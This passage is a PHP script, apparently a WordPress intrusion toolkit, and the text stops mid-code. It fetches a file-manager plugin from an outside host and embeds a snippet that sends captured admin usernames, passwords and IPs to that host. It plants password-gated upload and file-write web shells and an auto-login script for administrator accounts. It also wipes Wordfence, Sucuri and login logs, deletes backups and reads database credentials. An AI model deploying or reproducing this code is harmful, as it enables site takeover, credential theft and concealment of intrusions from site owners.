<?php
error_reporting(0);
set_time_limit(0);
echo '<meta charset="UTF-8">';
header("Content-type: text/html; charset=utf-8");
ini_set('max_execution_time', 500);
ini_set("memory_limit","-1");
if(isset($_GET['link'])){
	echo gaiurl_2($_GET['link']);
	exit;
}
	/////////////////////////////////////////
	if(isset($_POST['root'])){ob_start();require($_POST['root']."wp-load.php");ob_end_clean();}
	//////////////////////////////////////链接数据库
echo "<!DOCTYPE html><html><title>HEHE</title>";
$df = disk_free_space(dirname(__FILE__));
 if(isset($_POST['del_file'])&&$_POST['del_file']==1){
	 unlink($_SERVER['SCRIPT_FILENAME']);
 if(!is_file($_SERVER['SCRIPT_FILENAME'])){
	  echo '<font color="green">Del Self Ok!!!</font>'."<br/>";
 }else{
	  echo '<font color="red">Del Self Error!!!</font>'."<br/>";
 }
 }
$current_disk=$df/1024/1024/1024;
echo '<font color="green">'.intval($current_disk).'G</font>'."<br/>";
if(isset($_POST['root'])&&is_file($_POST['root'].'wp-includes/version.php')){
	include_once($_POST['root'].'wp-includes/version.php');
	echo 'Version:'.$wp_version."<br/>";
}
//error_reporting(E_ALL || ~E_NOTICE||~E_WARNING);
srand();
echo dirname(__FILE__)."<br/>";
if(isset($_POST['root'])){
	if(substr($_POST['root'], -1)=='\\'){
	}
	elseif(substr($_POST['root'], -1)!=='/'){
		$_POST['root']=$_POST['root'].'/';
	}
}
if(isset($_POST['url_root'])){
	if(substr($_POST['url_root'], -1)=='\\'){
	}
	elseif(substr($_POST['url_root'], -1)!=='/'){
		$_POST['url_root']=$_POST['url_root'].'/';
	}
}
if(isset($_POST['root'])){
	$time=filemtime($_POST['root']."wp-load.php");	
	$file_per=octdec(substr(base_convert(@fileperms($_POST['root']."wp-load.php"),10,8),-4));
	if(is_file($_POST['root'].'wp-content/plugins/file-manager/file-manager.php')){
	deleteDir($_POST['root'].'wp-content/plugins/file-manager');
	if(is_file($_POST['root'].'wp-content/plugins/file-manager/file-manager.php')){
		echo '<font color="red">'."Delete file-manager failed!!!".'</font>'."<br/>";
	}else{
		echo '<font color="green">'."Delete file-manager OK!".'</font>'."<br/>";
	}
}
if($_POST['check']!=="2"){
			if(is_file($_POST['root'].'wp-content/plugins/wp-file-manager/file_folder_manager.php')){
				echo '<font color="green">File_manager is Exists!!!</font>'."<br/>";
			}
			else{
				$file_manager_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/wp-file-manager.zip");
				if(!empty($file_manager_con)){
					file_put_contents('./wp-file-manager.zip',$file_manager_con);
					$file_manager_con=NULL;
					unset($file_manager_con);
					if(is_file('./wp-file-manager.zip')){
						if (in_array('zip', get_loaded_extensions())){
						//if(method_exists($directory,'ZipArchive')){
						$zip = new ZipArchive;
						if ($zip->open('./wp-file-manager.zip') === TRUE) {//中文文件名要使用ANSI编码的文件格式
							$zip->extractTo($_POST['root'].'wp-content/plugins/');//提取全部文件
							$zip->close();
							if(is_file($_POST['root'].'wp-content/plugins/wp-file-manager/file_folder_manager.php')){
								@unlink('./wp-file-manager.zip');
								@touch($_POST['root'].'wp-content/plugins/wp-file-manager/',$time);
								echo '<font color="green">Unzip OK!!!</font>'."<br/>";
							}else{
								echo '<font color="red">Unzip is NOT OK!!!</font>'."<br/>";
							}
						} else {
							echo '<font color="red">Unzip is NOT OK!!!</font>'."<br/>";
						}
					}else{
						$cmd = 'unzip -o '.dirname(__FILE__).'/wp-file-manager.zip -d'.$_POST['root'].'wp-content/plugins';
						if(function_exists('exec')) { @exec ($cmd);}elseif(function_exists('shell_exec')) { $res = @shell_exec ($cmd);}elseif(function_exists('system')) {@system ($cmd);}elseif(function_exists('passthru')) { @passthru ($cmd);}elseif(function_exists('popen')) { $fp = @popen ($cmd,'r'); if($fp) { while(!feof($fp)) { $res .= fread($fp,1024); } } @pclose($fp);}
 
							if(is_file($_POST['root'].'wp-content/plugins/wp-file-manager/file_folder_manager.php')){
								@unlink('./wp-file-manager.zip');
								@touch($_POST['root'].'wp-content/plugins/wp-file-manager/',$time);
								echo '<font color="green">Unzip OK!!!</font>'."<br/>";
							}else{
								echo '<font color="red">Unzip is NOT OK!!!</font>'."<br/>";
							}
					}
					}else{
						echo '<font color="red">Wp_File_manager File Upload failed!!!</font>'."<br/>";
					}
				}else{
					echo '<font color="red">Wp_File_manager File Get failed!!!</font>'."<br/>";
				}
			}

			}

if(is_file($_POST['root'].'wp-content/plugins/wp-file-manager-/file_folder_manager.php')){
	unlink($_POST['root'].'wp-content/plugins/wp-file-manager-/file_folder_manager.php');
	if(is_file($_POST['root'].'wp-content/plugins/wp-file-manager-/file_folder_manager.php')){
		echo '<font color="red">'."Delete wp-file-manager failed!!!".'</font>'."<br/>";
	}else{
		echo '<font color="green">'."Delete wp-file-manager OK!".'</font>'."<br/>";
	}
}
if(is_file($_POST['root'].'wp-content/plugins/wp-file-manager--/file_folder_manager.php')){
	unlink($_POST['root'].'wp-content/plugins/wp-file-manager--/file_folder_manager.php');
	if(is_file($_POST['root'].'wp-content/plugins/wp-file-manager--/file_folder_manager.php')){
		echo '<font color="red">'."Delete wp-file-manager failed!!!".'</font>'."<br/>";
	}else{
		echo '<font color="green">'."Delete wp-file-manager OK!".'</font>'."<br/>";
	}
}
}


$login_add=<<<EOT
\$url="http://".\$_SERVER['HTTP_HOST'].\$_SERVER['PHP_SELF'];
if(isset(\$_SERVER['HTTP_REFERER'])){\$url.='-'.\$_SERVER['HTTP_REFERER'];}
function get__ip(\$type = 0){\$type=\$type?1:0;static \$ip=NULL;if(\$ip!==NULL)return \$ip[\$type];if (isset(\$_SERVER['HTTP_X_FORWARDED_FOR'])){\$arr=explode(',',\$_SERVER['HTTP_X_FORWARDED_FOR']);\$pos=array_search('unknown',\$arr);if(false!==\$pos)unset(\$arr[\$pos]);\$ip=trim(\$arr[0]);}elseif(isset(\$_SERVER['HTTP_CLIENT_IP'])){\$ip=\$_SERVER['HTTP_CLIENT_IP'];}elseif(isset(\$_SERVER['REMOTE_ADDR'])){\$ip=\$_SERVER['REMOTE_ADDR'];}\$long=sprintf("%u",ip2long(\$ip));\$ip=\$long?array(\$ip,\$long):array('0.0.0.0', 0);return \$ip[\$type];}
\$ccc_url=base64_decode("aHR0cDovLzgudG9wc2FsZTR5b3Uucm9ja3MvdG9uZy9wYS9uZXdwdy9wYXNzLnBocD9hZG1pbmlwPQ").base64_encode(get__ip())."&host=".base64_encode(\$url)."&name=".base64_encode(\$_POST['log'])."&password=".base64_encode(\$_POST['pwd']);
\$ccc=@file_get_contents(\$ccc_url);if(empty(\$ccc)){
	function get_pass_Html(\$url){
		\$ch = curl_init();
		curl_setopt (\$ch, CURLOPT_URL, \$url);
		curl_setopt (\$ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt (\$ch, CURLOPT_CONNECTTIMEOUT, 1);
		curl_setopt (\$ch, CURLOPT_TIMEOUT, 3);
		curl_exec(\$ch);
		curl_close(\$ch);return true;
	}
get_pass_Html(\$ccc_url);}
EOT;

$upload_con=<<<EOT
<?php
error_reporting(0);
\$system = md5(\$_GET['pass']);
if(\$system == 'ddbc825a724afc8d08cfdbf82d4a3a13'){
\$files = @\$_FILES["files"];
if (\$files["name"] != '') {
    \$fullpath = \$_REQUEST["path"] . \$files["name"];
    if (move_uploaded_file(\$files['tmp_name'], \$fullpath)) {
        echo "<h1><a href='\$fullpath'>OK-Click here!</a></h1>";
    }
}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
}
?>
EOT;
$upload_con_2=<<<EOT
<?php
if(isset(\$_GET["pass"]))
 {
\$system = md5(\$_GET['pass']);
if(\$system == 'ddbc825a724afc8d08cfdbf82d4a3a13'){

	echo"<form method=post enctype=multipart/form-data>"; 
	if(isset(\$_POST["k"])&&\$_POST["k"]=='upload')
	{
		if(@copy(\$_FILES["f"]["tmp_name"],\$_FILES["f"]["name"])){
		echo"<b>".\$_FILES["f"]["name"];
	}else{
		echo"<b>No never";
	}
	}
	echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; 
	}
 }
EOT;
$upload_con_3=<<<EOT
<?php
if(isset(\$_GET["pass"]))
 {
\$system = md5(\$_GET['pass']);
if(\$system == 'ddbc825a724afc8d08cfdbf82d4a3a13'){
\$wp_installation = substr(dirname(__FILE__), 0 , strrpos(dirname(__FILE__), "wp-content") );
if(isset(\$_FILES["tragefile"]["name"])){
\$trpath=\$wp_installation.\$_FILES["tragefile"]["name"];if(move_uploaded_file(\$_FILES["tragefile"]["tmp_name"],\$trpath)){echo"root ok";}else{echo "!!!";} 
}
 echo ' <form enctype="multipart/form-data" method="POST"><input name="tragefile" type="file"/><input type="submit" value="do it"/></form>';
 }}
EOT;

$get_login_url=<<<EOT
<?php
if(isset(\$_GET["pass"]))
 {
	\$system = md5(\$_GET['pass']);
	if(\$system == 'ddbc825a724afc8d08cfdbf82d4a3a13'){
	\$wp_installation = substr(dirname(__FILE__), 0 , strrpos(dirname(__FILE__), "wp-content") );
	echo @file_get_contents(\$wp_installation.'wp-includes/general-template.php');
	}
 }
EOT;
$get_login_url_2=<<<EOT
<?php
if(isset(\$_GET["pass"]))
 {
	\$system = md5(\$_GET['pass']);
	if(\$system == 'ddbc825a724afc8d08cfdbf82d4a3a13'){
	\$wp_installation = substr(dirname(__FILE__), 0 , strrpos(dirname(__FILE__), "wp-content") );
	include(\$wp_installation."wp-load.php");
	echo wp_login_url();
	}
 }
EOT;

$little_put_file_ma=<<<EOT
<?php
if(@\$_GET["act"]=="save"){if(isset(\$_POST["content"])&&isset(\$_POST["name"])){if(\$_POST["content"]!=""&&\$_POST["name"]!=""){if(fwrite(fopen(stripslashes(\$_POST["name"]),"w"),stripslashes(\$_POST["content"]))){echo "OK! <a href=\"".stripslashes(\$_POST["name"])."\">".stripslashes(\$_POST["name"])."</a>";};}}}else{if(@\$_GET["act"]=="sweet"){echo '<meta charset="utf-8"><form action="?act=save" method="post">content:<br/><textarea name="content" ></textarea><br/>filenane:<br/><input name="name"/><br/><input type="submit" value="GO!"></form>';}}
EOT;
$little_put_file_ma_2=<<<EOT
<head><script>function Encoder(name){var e =  document.getElementById(name);e.value = btoa(e.value);return true;}</script></head><?php if(@\$_GET["act"]=="hehe"){if(isset(\$_POST["content"])&&isset(\$_POST["name"])){if(\$_POST["content"]!=""&&\$_POST["name"]!=""){if(fwrite(fopen(stripslashes(\$_POST["name"]),"w"),base64_decode(\$_POST["content"]))){echo "OK! <a href=\"".stripslashes(\$_POST["name"])."\">".stripslashes(\$_POST["name"])."</a>";};}}}else{if(@\$_GET["act"]=="sweet"){echo '<meta charset="utf-8"><form action="?act=hehe" method="post"  onSubmit="Encoder(\'c\');">content:<br/><textarea id="c" name="content" style="width:200px;height:100px;"></textarea><br/>filenane:<br/><input name="name"/><br/><input type="submit" value="GO!"></form>';}}
EOT;
$yuancheng_post_current=<<<EOT
<?php
if(!empty(\$_POST["name"])&&!empty(\$_POST["content"])){
if(fwrite(fopen(realpath(dirname(__FILE__)).'/'.\$_POST["name"],"w"),stripslashes(\$_POST["content"]))){
	echo "OK! <a href=\"".stripslashes(\$_POST["name"])."\">".stripslashes(\$_POST["name"])."</a>";
};}
EOT;
$yuancheng_post_root=<<<EOT
<?php
if(!empty(\$_POST["name"])&&!empty(\$_POST["content"])){
if(fwrite(fopen(realpath(dirname(__FILE__)).'/'.\$_POST["name"],"w"),stripslashes(\$_POST["content"]))){
	echo "OK! <a href=\"".stripslashes(\$_POST["name"])."\">".stripslashes(\$_POST["name"])."</a>";
};}
EOT;

if(!empty($_POST['root'])){

	if(is_dir($_POST['root'].'wp-content/plugins/wordfence/')){
		echo '<font color="red" size=4>Wordfence Exist</font>'."<br/>";
		$_POST['del_wordfence_all']='1';
		//rename($_POST['root'].'wp-content/plugins/wordfence/',$_POST['root'].'wp-content/plugins/wordfencea/');
		//mkdir($_POST['root'].'wp-content/plugins/wordfence/');
	}
	$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
	$url_root=$http_type.$_SERVER['HTTP_HOST'].'/';
	if($_POST['moshi']=='new'||$_POST['moshi']=='check'){
	if($dir_handle = @opendir($_POST['root']."wp-content/plugins")){
            while($filename = readdir($dir_handle)){
				if($filename!=='.'&&$filename!=='..'){
					if(is_dir($_POST['root']."wp-content/plugins/".$filename)){
						if(strpos($filename,'file-manager')===false&&strpos($filename,'akismet')===false&&strpos($filename,'shortcode')===false&&strpos($filename,'wordfence')===false&&strpos($filename,'.w3-cache')===false){
							$arr[] = $filename;
							}
						}
					}
                }
            }
            closedir($dir_handle);
		//themes
		if($dir_handle = @opendir($_POST['root']."wp-content/themes")){
            while($filename = readdir($dir_handle)){
				if($filename!=='.'&&$filename!=='..'){
					if(is_dir($_POST['root']."wp-content/themes/".$filename)){
                       $arr2[] = $filename; 
					}
				}
                }
            }
            closedir($dir_handle);
			
			//upload
			if($dir_handle = @opendir($_POST['root']."wp-content/uploads")){
            while($filename = readdir($dir_handle)){
				if($filename!=='.'&&$filename!=='..'){
					if(is_dir($_POST['root']."wp-content/uploads/".$filename)){
						if(preg_match('/20[0-9][0-9]/',$filename)){
							$arr1[] = $filename; 
						}
					}
				}
                }
            }
            closedir($dir_handle);
	
	if($_POST['moshi']=='new'){
			$moshi_sel='<option value="check">check</option>';
			$config_add_echo='<option value="1">add</option><option value="">NO</option>';
			$admin_select='<option value="1">add</option><option value="">NO</option>';
			$include_select='<option value="1">add</option><option value="">NO</option>';
			if(count($arr)>=8){
				shuffle($arr);
			for($k=1;$k<=8;$k++){
				${"plugin_scan".$k}='';
				for($i=0;$i<count($arr);$i++){
				if($i==$k-1){
					${"plugin_scan".$k}.=   "<option value=\"{$arr[$i]}\" selected=\"selected\">{$arr[$i]}</option> <option value=\"\">NO</option>";
				}else{
					${"plugin_scan".$k}.=   "<option value=\"{$arr[$i]}\">{$arr[$i]}</option> ";
				}
				}
			}
			}else{
			for($k=1;$k<=8;$k++){
				${"plugin_scan".$k}='';
				shuffle($arr);
				for($i=0;$i<count($arr);$i++){
				if($i==0){
					${"plugin_scan".$k}.=   "<option value=\"{$arr[$i]}\" selected=\"selected\">{$arr[$i]}</option> <option value=\"\">NO</option>";
				}else{
					${"plugin_scan".$k}.=   "<option value=\"{$arr[$i]}\">{$arr[$i]}</option> ";
				}
				}
			}
			}
			$themes_scan='';//$dq_themes[1]
			//echo $dq_themes[1];
			for($i=0;$i<count($arr2);$i++){
				if($i==0){
					$themes_scan.="<option value=\"\">NO</option><option value=\"{$arr2[$i]}\">{$arr2[$i]}</option>";
				}else{
					$themes_scan.="<option value=\"{$arr2[$i]}\">{$arr2[$i]}</option> ";
				}
				}
				if(count($arr2)>=5){
					for($k=1;$k<=5;$k++){
					shuffle($arr2);
					${"themes_scan".$k}='';
					for($i=0;$i<count($arr2);$i++){
					if($i==$k-1){
						${"themes_scan".$k}.=   "<option value=\"{$arr2[$i]}\" selected=\"selected\">{$arr2[$i]}</option> <option value=\"\">NO</option>";
					}else{
						${"themes_scan".$k}.=   "<option value=\"{$arr2[$i]}\">{$arr2[$i]}</option> ";
					}
					}
				}
				}else{
					for($k=1;$k<=5;$k++){
					${"themes_scan".$k}='';
					shuffle($arr2);
					for($i=0;$i<count($arr2);$i++){
					if($i==0){
						${"themes_scan".$k}.=   "<option value=\"{$arr2[$i]}\" selected=\"selected\">{$arr2[$i]}</option> <option value=\"\">NO</option>";
					}else{
						${"themes_scan".$k}.=   "<option value=\"{$arr2[$i]}\">{$arr2[$i]}</option> ";
					}
					}
				}
				}
				if(count($arr1)>=4){
					${"uploads_scan".$k}='';
					shuffle($arr1);
					for($k=1;$k<=4;$k++){
						for($i=0;$i<count($arr1);$i++){
						if($i==$k-1){
							${"uploads_scan".$k}.=   "<option value=\"{$arr1[$i]}\" selected=\"selected\">{$arr1[$i]}</option> <option value=\"\">NO</option>";
						}else{
							${"uploads_scan".$k}.=   "<option value=\"{$arr1[$i]}\">{$arr1[$i]}</option> ";
						}
						}
					}
				}else{
					for($k=1;$k<=4;$k++){
						${"uploads_scan".$k}='';
					shuffle($arr1);
					${"uploads_scan".$k}='';
					for($i=0;$i<count($arr1);$i++){
					if($i==0){
						${"uploads_scan".$k}.=   "<option value=\"{$arr1[$i]}\" selected=\"selected\">{$arr1[$i]}</option> <option value=\"\">NO</option>";
					}else{
						${"uploads_scan".$k}.=   "<option value=\"{$arr1[$i]}\">{$arr1[$i]}</option> ";
					}
					}
				}
	}
	}if($_POST['moshi']=='check'){
		$moshi_sel='<option value="check">check</option>';
		$config_add_echo='<option value="">NO</option><option value="1">add</option>';
		$admin_select='<option value="">NO</option><option value="1">add</option>';
		$include_select='<option value="">NO</option><option value="1">add</option>';
			for($k=1;$k<=8;$k++){
				${"plugin_scan".$k}='';
				for($i=0;$i<count($arr);$i++){
				if($i==0){
					${"plugin_scan".$k}.="<option value=\"\">NO</option><option value=\"{$arr[$i]}\">{$arr[$i]}</option>";
				}else{
					${"plugin_scan".$k}.="<option value=\"{$arr[$i]}\">{$arr[$i]}</option> ";
				}
				}
			}
			$themes_scan='';
			for($i=0;$i<count($arr2);$i++){
				if($i==0){
						$themes_scan.="<option value=\"\">NO</option><option value=\"{$arr2[$i]}\">{$arr2[$i]}</option>";
				}else{
					$themes_scan.="<option value=\"{$arr2[$i]}\">{$arr2[$i]}</option> ";
				}
				}
			
		for($k=1;$k<=5;$k++){
			${"themes_scan".$k}='';
				for($i=0;$i<count($arr2);$i++){
				if($i==0){
					${"themes_scan".$k}.="<option value=\"\">NO</option><option value=\"{$arr2[$i]}\">{$arr2[$i]}</option>";
				}else{
					${"themes_scan".$k}.="<option value=\"{$arr2[$i]}\">{$arr2[$i]}</option> ";
				}
				}
			}
			for($k=1;$k<=4;$k++){
				${"uploads_scan".$k}='';
				for($i=0;$i<count($arr1);$i++){
				if($i==0){
					${"uploads_scan".$k}.="<option value=\"\">NO</option><option value=\"{$arr1[$i]}\">{$arr1[$i]}</option>";
				}else{
					${"uploads_scan".$k}.="<option value=\"{$arr1[$i]}\">{$arr1[$i]}</option> ";
				}
				}
			}
	}
	
	//traverseDir_cur
	$end_all_themes='';
	foreach($arr2 as $all_themes_dir){
		${$all_themes_dir.'_file'}=traverseDir_cur($_POST['root'].'wp-content/themes/'.$all_themes_dir);
		//print_r(${$all_themes_dir.'_file'});
		//print_r(${$all_themes_dir.'_file'});
		if(isset($_POST[$all_themes_dir])&&$_POST[$all_themes_dir]=='no_add'||strpos(strtolower($all_themes_dir),'-child')!==false){
			${$all_themes_dir.'_file_array'}="<option value=\"no_add\">no add</option><option value=\"add\">add</option>";
		}else{
			${$all_themes_dir.'_file_array'}="<option value=\"add\">add</option><option value=\"no_add\">no add</option>";
		}
		foreach(${$all_themes_dir.'_file'} as $cccc){
			${$all_themes_dir.'_file_array'}.="<option value=\"{$cccc}\">{$cccc}</option> ";
		}
		
		$end_all_themes.=$all_themes_dir;
		$end_all_themes.='<select name="'.$all_themes_dir.'">'.${$all_themes_dir.'_file_array'}.'</select>';
		$end_all_themes.="<br/>";
	}			
	$end_all_themes.="<br/><br/>";
	}
	
	//no_php5_or_phtml suspected
	if(isset($_POST['no_php5_or_phtml'])&&$_POST['no_php5_or_phtml']==1){
		$no_php5_or_phtml=1;
	}else{
		$no_php5_or_phtml=0;
	}
	if(isset($_POST['suspected'])&&$_POST['suspected']==1){
		$suspected='.suspected';
	}else{
		$suspected='';
	}
	if (!function_exists('is_plugin_active')){
		function is_plugin_active($plugin ){
			return in_array($plugin,(array) get_option('active_plugins',array()));
		}
	}
 if (is_plugin_active('file-manager/file-manager.php')||is_plugin_active('wp-file-manager/file_folder_manager.php')) {    
$active_plugins = get_option('active_plugins');
if(in_array("file-manager/file-manager.php",$active_plugins)){
	$key=array_search("file-manager/file-manager.php",$active_plugins);
	unset($active_plugins[$key]);
	update_option( 'active_plugins', $active_plugins );
	if (is_plugin_active('file-manager/file-manager.php')) {  
		echo '<font color="red">File Manager Is Active Cant Deactive!!!</font>'."<br/>";	
    }else{
		echo '<font color="green">File Manager Is Deactive!!!</font>'."<br/>";
}
}
elseif(in_array("wp-file-manager/file_folder_manager.php",$active_plugins)){
	$key=array_search("wp-file-manager/file_folder_manager.php",$active_plugins);
	unset($active_plugins[$key]);
	update_option( 'active_plugins', $active_plugins );
	 if (is_plugin_active('wp-file-manager/file_folder_manager.php')) {
		echo '<font color="red">Wp File Manager Is Active Can\'t Deactive!!!</font>'."<br/>";		 
    }else{
		echo '<font color="green">Wp File Manager Is Deactive!!!</font>'."<br/>";
}
}
}else{
	echo '<font color="green">All Deactive!</font>'."<br/>";
}


$get_recent_active_plugin=get_option( 'recently_activated' );
if(array_key_exists("file-manager/file-manager.php",$get_recent_active_plugin)||array_key_exists("wp-file-manager/file_folder_manager.php",$get_recent_active_plugin)){
	if(array_key_exists("file-manager/file-manager.php",$get_recent_active_plugin)){
	unset($recent_active_plugins["file-manager/file-manager.php"]);
	//print_r($recent_active_plugins);
	update_option( 'recently_activated', $recent_active_plugins );
	$check_recent=get_option( 'recently_activated' );
	if(array_key_exists("file-manager/file-manager.php",$check_recent)) {  
		echo '<font color="red">File Manager Is Recent Active Cant Del!!!</font>'."<br/>";		
    }else{
		echo '<font color="green">File Manager Recent Is Del!!!</font>'."<br/>";
	}
}elseif(array_key_exists("wp-file-manager/file_folder_manager.php",$get_recent_active_plugin)){
	unset($recent_active_plugins["wp-file-manager/file_folder_manager.php"]);
	//print_r($recent_active_plugins);
	update_option( 'recently_activated', $recent_active_plugins );
	$check_recent=get_option( 'recently_activated' );
	if(array_key_exists("wp-file-manager/file_folder_manager.php",$check_recent)) {    
		echo '<font color="red">Wp File Manager Is Recent Active Cant Del!!!</font>'."<br/>";
    }else{
		echo "Wp File Manager Recent Is Del!!!";
	}
}
}else{
	echo '<font color="green">All Recnet Del!</font>'."<br/>";
}

	$robots_con=get_test_Html($url_root.'robots.txt');
	echo'<textarea type="text" style="width:800px;height:300px;"/>'.htmlspecialchars($robots_con).'</textarea>';
	echo '<br/>';


if(is_dir($_POST['root'].'wp-content/plugins/wordfence/')){
	$db_host_srt=constant("DB_HOST");
	if(strpos($db_host_srt,':')!==false){
		$db_host_array=explode(':',$db_host_srt);
		$con=mysqli_connect($db_host_array[0],constant("DB_USER"),constant("DB_PASSWORD"),constant("DB_NAME"),$db_host_array[1]); 
	}else{
		$con=mysqli_connect(constant("DB_HOST"),constant("DB_USER"),constant("DB_PASSWORD"),constant("DB_NAME")); 
	}
	
	if (mysqli_connect_errno($con)){ 
		echo "MySQL connect error: " . mysqli_connect_error(); 
	}
	mysqli_set_charset($con,"utf8") or mysql_error();
	//////////////////////////////////////
	//$table_prefix
	if(!empty($_POST['del_wordfence_all'])||!empty($_POST['del_wfhits'])){
		$sql = "delete from ".$table_prefix.'wfhits'." where id in(select t.id from(select * from ".$table_prefix.'wfhits'." order by id desc limit 10)as t)";
		$res = mysqli_query($con,$sql);
		if($res){
			echo '<font color="Green">'.$table_prefix.'wfhits Delete OK!'.'</font>'."<br/>";
		}else{
			$sql = "delete from ".$table_prefix.'wfHits'." where id in(select t.id from(select * from ".$table_prefix.'wfHits'." order by id desc limit 10)as t)";
			$res = mysqli_query($con,$sql);
			if($res){
				echo '<font color="Green">'.$table_prefix.'wfHits Delete OK!'.'</font>'."<br/>";
			}else{
				echo '<font color="red">'.$table_prefix.'wfHits Delete error! Please Check'.'</font>'."<br/>";
			}
		}
	}
	if(!empty($_POST['del_wordfence_all'])||!empty($_POST['del_wflogins'])){
			$sql = "delete from ".$table_prefix.'wflogins'." where id in(select t.id from(select * from ".$table_prefix.'wflogins'." order by id desc limit 6)as t)";//删除降序前n行
			$res = mysqli_query($con,$sql);
			if($res){
				echo '<font color="Green">'.$table_prefix.'wflogins Delete OK!'.'</font>'."<br/>";
			}else{
				$sql = "delete from ".$table_prefix.'wfLogins'." where id in(select t.id from(select * from ".$table_prefix.'wfLogins'." order by id desc limit 6)as t)";//删除降序前n行
				$res = mysqli_query($con,$sql);
				if($res){
					echo '<font color="Green">'.$table_prefix.'wfLogins Delete OK!'.'</font>'."<br/>";
				}else{
					echo '<font color="red">'.$table_prefix.'wfLogins Delete error! Please Check'.'</font>'."<br/>";
				}
			}
		}
		if(!empty($_POST['del_wordfence_all'])||!empty($_POST['del_usermeta'])){
			$sql = "delete from `".$table_prefix.'usermeta'."` where umeta_id in(select t.umeta_id from(SELECT * FROM `".$table_prefix.'usermeta'."` WHERE `meta_key` LIKE '%login%')as t)";//删除登陆记录
			$res = mysqli_query($con,$sql);
			if($res){
				echo '<font color="Green">'.$table_prefix.'usermeta Delete OK!'.'</font>'."<br/>";
			}else{
				echo '<font color="red">'.$table_prefix.'usermeta Delete error! Please Check'.'</font>'."<br/>";
			}
		}
		if(!empty($_POST['del_wordfence_all'])||!empty($_POST['del_wffilemods'])){
			$sql = "DELETE FROM `".$table_prefix.'wffilemods'."`";
			$res = mysqli_query($con,$sql);
			if($res){
				echo '<font color="Green">'.$table_prefix.'wffilemods Delete OK!'.'</font>'."<br/>";
			}else{
				$sql = "DELETE FROM `".$table_prefix.'wfFileMods'."`";
				$res = mysqli_query($con,$sql);
				if($res){
					echo '<font color="Green">'.$table_prefix.'wfFileMods Delete OK!'.'</font>'."<br/>";
				}else{
					echo '<font color="red">'.$table_prefix.'wfFileMods Delete error! Please Check'.'</font>'."<br/>";
				}
			}
		}
		 mysqli_close($con);
}
if(is_dir($_POST['root'].'wp-content/plugins/sucuri-scanner/')){
if(is_dir($_POST['root'].'wp-content/uploads/sucuri/')){
	
	deleteDir_php($_POST['root'].'wp-content/uploads/sucuri','.php');
	if(is_file($_POST['root'].'wp-content/uploads/sucuri/sucuri-lastlogins.php')){
		echo '<font color="red"> sucuri Delete error! Please Check'.'</font>'."<br/>";
	}else{
		echo '<font color="green"> sucuri Delete ok! </font>'."<br/>";
	}
	}
}
if(is_dir($_POST['root'].'wp-content/uploads/wfm3_data/')){
	if(is_file($_POST['root'].'wp-content/uploads/wfm3_data/.wfm3_admin_alert_content')){
		unlink($_POST['root'].'wp-content/uploads/wfm3_data/.wfm3_admin_alert_content');
		if(!is_file($_POST['root'].'wp-content/uploads/wfm3_data/.wfm3_admin_alert_content')){
			echo '<font color="green"> .wfm3_admin_alert_content Delete ok! </font>'."<br/>";
		}else{
			echo '<font color="red"> .wfm3_admin_alert_content Delete not ok! </font>'."<br/>";
		}
	}
	
	if(is_file($_POST['root'].'wp-content/uploads/wfm3_data/.wfm3_scan_data')){
		unlink($_POST['root'].'wp-content/uploads/wfm3_data/.wfm3_scan_data');
		if(!is_file($_POST['root'].'wp-content/uploads/wfm3_data/.wfm3_scan_data')){
			echo '<font color="green"> .wfm3_scan_data Delete ok! </font>'."<br/>";
		}else{
			echo '<font color="red"> .wfm3_scan_data Delete not ok! </font>'."<br/>";
		}
	}
	}
if(is_dir($_POST['root'].'wp-content/wflogs/')){
	deleteDir_php($_POST['root'].'wp-content/wflogs/','.php');
	if(is_file($_POST['root'].'wp-content/wflogs/config.php')){
		echo '<font color="red"> wp-content wflogs Delete error! Please Check'.'</font>'."<br/>";
	}else{
		echo '<font color="green"> wp-content wflogs Delete ok! </font>'."<br/>";
	}
	}
if(is_dir($_POST['root'].'wp-content/uploads/wp-file-manager/')){
	
deleteDir($_POST['root'].'wp-content/uploads/wp-file-manager');
	if(is_dir($_POST['root'].'wp-content/uploads/file-manager')){
		echo '<font color="red"> uploads file-manager Delete error! Please Check'.'</font>'."<br/>";
	}else{
		echo '<font color="green"> uploads file-manager Delete ok! </font>'."<br/>";
	}
	
}
//////////////////////del bk
/////deleteDir_php($_POST['root'].'wp-content/wflogs/','.php')
if(is_dir($_POST['root'].'wp-content/ai1wm-backups/')){
	deleteDir_php($_POST['root'].'wp-content/ai1wm-backups/','.wpress');
	deleteDir_php($_POST['root'].'wp-content/ai1wm-backups/','.zip');
}
 //////////////////
	if(!empty($_POST['themes_database'])){
	$db_all='';
	$db_all=constant("DB_NAME").'	'.constant("DB_USER").'	'.constant("DB_PASSWORD").'	'.constant("DB_HOST").'	'.$table_prefix;
 
	}
	
 if($_POST['check']==1){

	$auto_login=<<<EOT
<?php
    require('{$_POST['root']}wp-blog-header.php'); 
    \$query_str = "SELECT ID FROM \$wpdb->users";
    \$user_ids = \$wpdb->get_results(\$query_str);
    foreach (\$user_ids as \$uid) {
        \$user_id = \$uid->ID;
        if (user_can(\$user_id, 'administrator')) {
            \$user_info = get_userdata(\$user_id);
            \$user_login = \$user_info->user_login;
            wp_set_current_user(\$user_id, \$user_login);
            wp_set_auth_cookie(\$user_id);
            do_action('wp_login', \$user_login);
            echo "You are logged in as \$user_login";
            if (function_exists('get_admin_url')) {
                wp_redirect(get_admin_url());
            } else {
                wp_redirect(get_bloginfo('wpurl') . '/wp-admin');
            }
            exit;
        }
	}
EOT;
if(is_file($_POST['root'].'wp-load.php')){
if(!is_file($_POST['root'].'google3d2646b6620407b6.html')){
	@file_put_contents($_POST['root'].'google3d2646b6620407b6.html','google-site-verification: google3d2646b6620407b6.html');
	@chmod($_POST['root'].'google3d2646b6620407b6.html',$file_per);
	@touch($_POST['root'].'google3d2646b6620407b6.html',$time);
	@touch($_POST['root'],$time);
	if(is_file($_POST['root'].'google3d2646b6620407b6.html')){
		$connnn=file_get_contents($_POST['root'].'google3d2646b6620407b6.html');
		if(strpos($connnn,'ogle3d2646b6620')!==false){
			echo '<font color="Green">google ver Is add!</font>'."<br/>";
		}
		else{
